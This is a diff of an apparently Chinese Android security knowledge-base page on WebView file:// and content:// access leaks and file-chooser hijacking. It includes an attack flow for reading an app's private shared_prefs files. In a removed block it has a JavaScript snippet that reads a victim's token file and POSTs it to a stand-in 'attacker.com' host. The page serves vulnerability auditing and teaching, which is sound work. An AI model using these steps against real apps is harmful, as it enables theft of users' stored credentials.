@@ -1,4 +1,4 @@
-# file:// 协议访问
+# 文件访问泄露
 
 应用显式启用 `setAllowFileAccessFromFileURLs(true)` 或 `setAllowUniversalAccessFromFileURLs(true)`，攻击者通过 `file://` URI 读取私有文件。
 
@@ -14,16 +14,21 @@
 **Android 版本范围：所有版本（需应用显式开启）** — Android 11 (API 30) 起默认 false 且已废弃，但应用显式设为 true 时仍可利用。
 
 
-## 关键特征
+## 攻击流程
 
-- `setAllowFileAccessFromFileURLs(true)`（显式开启）
-- `setAllowUniversalAccessFromFileURLs(true)`（显式开启）
-- WebView 可加载攻击者可控 URL
-- **content:// 访问**：WebView 默认允许访问 content:// URI（`setAllowContentAccess` 默认 true），可触发 Provider 的 `openFile()` 等危险方法
-- **文件选择器劫持**：`onShowFileChooser()` 使用隐式 Intent 选择文件，攻击者可截获并返回受保护文件的 URI
+```
+1. jiap code subclass android.webkit.WebView → 定位 WebView Activity
+2. jiap code class-source <WebViewActivity> → 检查 WebSettings 配置
+3. 确认 setAllowFileAccess(true) 和 setAllowFileAccessFromFileURLs(true)
+4. 检查 loadUrl() 参数来源（Intent data、extras）
+5. 构造 file:///data/data/<pkg>/shared_prefs/config.xml
+6. 通过 Deep Link 或 Intent 触发 WebView 加载恶意 URI
+```
 
 
-## 代码模式
+## 关键特征与代码
+
+- 显式启用 `setAllowFileAccessFromFileURLs(true)` 或 `setAllowUniversalAccessFromFileURLs(true)`，且 WebView 可加载攻击者可控 URL
 
 ```java
 // 漏洞：允许 file:// 协议访问
@@ -36,16 +41,7 @@ settings.setAllowFileAccessFromFileURLs(true); // 允许 JS 读取本地文件
 // file:///data/data/com.app/shared_prefs/config.xml
 ```
 
-```javascript
-// 攻击代码：通过 XHR 读取应用私有文件
-var xhr = new XMLHttpRequest();
-xhr.open("GET", "file:///data/data/com.victim/shared_prefs/token.xml", false);
-xhr.send();
-// 将 xhr.responseText 发送到攻击者服务器
-fetch("https://attacker.com/exfil", { method: "POST", body: xhr.responseText });
-```
-
-### 模式 2：content:// URI 访问 Provider
+- **content:// 访问**：WebView 默认允许访问 content:// URI（`setAllowContentAccess` 默认 true），可触发 Provider 的 `openFile()` 等危险方法
 
 ```java
 // WebView 默认允许加载 content:// URI
@@ -54,7 +50,7 @@ webView.loadUrl("content://com.victim.provider/debug");
 // Provider 的 openFile() 返回的数据会被 WebView 加载和渲染
 ```
 
-### 模式 3：文件选择器劫持（onShowFileChooser）
+- **文件选择器劫持**：`onShowFileChooser()` 使用隐式 Intent 选择文件，攻击者可截获并返回受保护文件的 URI
 
 ```java
 // 漏洞：onShowFileChooser 使用隐式 Intent 选择文件，攻击者可截获并返回受保护文件 URI
@@ -85,18 +81,6 @@ protected void onActivityResult(int requestCode, int resultCode, Intent data) {
 // Uri uri = Uri.parse("file:///data/user/0/com.victim/shared_prefs/secrets.xml");
 // setResult(RESULT_OK, new Intent().setData(uri));
 // finish();
-```
-
-
-## 攻击流程
-
-```
-1. jiap code subclass android.webkit.WebView → 定位 WebView Activity
-2. jiap code class-source <WebViewActivity> → 检查 WebSettings 配置
-3. 确认 setAllowFileAccess(true) 和 setAllowFileAccessFromFileURLs(true)
-4. 检查 loadUrl() 参数来源（Intent data、extras）
-5. 构造 file:///data/data/<pkg>/shared_prefs/config.xml
-6. 通过 Deep Link 或 Intent 触发 WebView 加载恶意 URI
 ```
 
 
@@ -165,4 +149,3 @@ if (BuildConfig.DEBUG) {
 - [[app-provider]]
 - [[app-webview]]
 - [[app-webview-url-bypass]]
-
